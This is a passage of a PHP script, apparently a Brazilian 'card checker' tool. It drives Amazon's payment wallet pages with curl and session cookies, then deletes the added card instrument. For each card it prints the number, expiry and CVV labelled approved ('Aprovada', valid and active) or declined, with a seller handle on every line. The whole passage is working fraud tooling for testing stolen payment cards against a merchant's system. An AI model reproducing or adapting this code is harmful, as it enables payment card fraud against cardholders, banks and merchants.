'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie2"

));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$token18.'&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent');
  $data12 = curl_exec($ch); 
  
   
   
   
   
   
   








   
   




    
  

//___________________________________//

$valores = array('R$ 0,24','R$ 0,15','R$ 0,75','R$ 0,80','R$ 0,40','R$ 1,32','R$ 1,77','R$ 0,23','R$ 0,84','R$ 0,53', 'R$ 0,28','R$ 0,15','R$ 0,15','R$ 0,82','R$ 0,95','R$ 0,74','R$ 0,24','R$ 0,75','R$ 0,12','R$ 0,37');
$debitouu = $valores[mt_rand(0,9)];
function rand_float($st_num=0,$end_num=1,$mul=100)
{if ($st_num>$end_num) 
	return false; 
	return mt_rand($st_num*$mul,$end_num*$mul)/$mul; }


$debitou2 = rand_float(0, 2);

if (strpos($data3, 'payStationVerificationId":"","preferenceId":"')) {  
    echo "<font size='2,8'><span class='badge badge-success'>#Aprovada ✔️ </span> <font color='white'>".$cc."|".$mes."|".$ano."|".$cvv." <span class='badge badge-success'>".$bin."</span> | <span class='badge badge-warning'>CARTAO VALIDO E ATIVO</span> <span class='badge badge-primary'>@pladixoficial</span><br>";

exit();
}
else if (strpos($data3, 'different')) {  
    echo "<font size='2,8'><span class='badge badge-danger'>#Reprovada </span> <font color='white'>".$cc."|".$mes."|".$ano."|".$cvv." <span class='badge badge-danger'>".$bin."</span> | <span class='badge badge-danger'> [Retorno: Cartão recusado pelo banco emisor]</span> | <span class='badge badge-primary'>@pladixoficial</span><br>";
     
        
      exit();
}else if (strpos($data3, 'incorreto')) {  
    echo "<font size='2,8'><span class='badge badge-danger'>#Reprovada </span> <font color='white'>".$cc."|".$mes."|".$ano."|".$cvv." <span class='badge badge-danger'>".$bin."</span> | <span class='badge badge-danger'>CARTAO RECUSADO</span> | <span class='badge badge-primary'>@pladixoficial</span><br>";
     sleep(5);
exit();
	  
     } else {
        echo "<font size='2,8'><span class='badge badge-danger'>#Reprovada </span> <font color='white'>".$cc."|".$mes."|".$ano."|".$cvv." <span class='badge badge-danger'></span> | </span> <font color='orange'>CHAME O ADMIN: @pladixoficial</span> | <span class='badge badge-primary'></span><br>";
     

				}


?>